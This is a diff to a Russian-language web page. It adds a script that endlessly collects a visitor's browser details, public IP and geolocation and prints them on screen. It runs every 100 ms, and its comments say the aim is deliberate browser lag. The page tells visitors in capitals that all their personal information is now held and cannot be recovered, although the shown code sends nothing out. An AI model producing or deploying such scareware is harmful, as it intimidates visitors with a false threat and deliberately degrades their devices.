@@ -125,6 +125,50 @@
 
 getUserData();
 </script>
+
+    <div id="output" style="white-space: pre-wrap;"></div>
+
+<script>
+async function getUserData() {
+    let output = document.getElementById("output");
+
+    while (true) {
+        let data = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenSize: `${screen.width}x${screen.height}`,
+            timestamp: new Date().toLocaleTimeString()
+        };
+
+        try {
+            let ipInfo = await fetch("https://api64.ipify.org?format=json");
+            let ipData = await ipInfo.json();
+            data.ip = ipData.ip;
+        } catch (e) {
+            data.ip = "Не удалось получить IP";
+        }
+
+        // Геолокация - оборачиваем в промис для await
+        data.location = await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve(`Широта: ${pos.coords.latitude}, Долгота: ${pos.coords.longitude}`),
+                () => resolve("Доступ запрещён")
+            );
+        });
+
+        output.textContent = JSON.stringify(data, null, 2);
+
+        // Лаги будут, если сделать почти без задержек
+        // Чтобы было еще тяжелее - убираем задержку вообще
+        // Но чтобы браузер не сгорел моментально, ставим минимум 100 мс
+        await new Promise(r => setTimeout(r, 100));
+    }
+}
+
+// Запускаем бесконечный цикл сразу
+getUserData();
+</script>
     
 </head>
 <body>
@@ -138,4 +182,5 @@ getUserData();
     <p class="warning">ВСЯ ВАША ЛИЧНАЯ ИНФОРМАЦИЯ НАХОДИТЬСЯ У НАС! попытка восстановить не будет успешной</p>
 </body>
 </html>
+
 
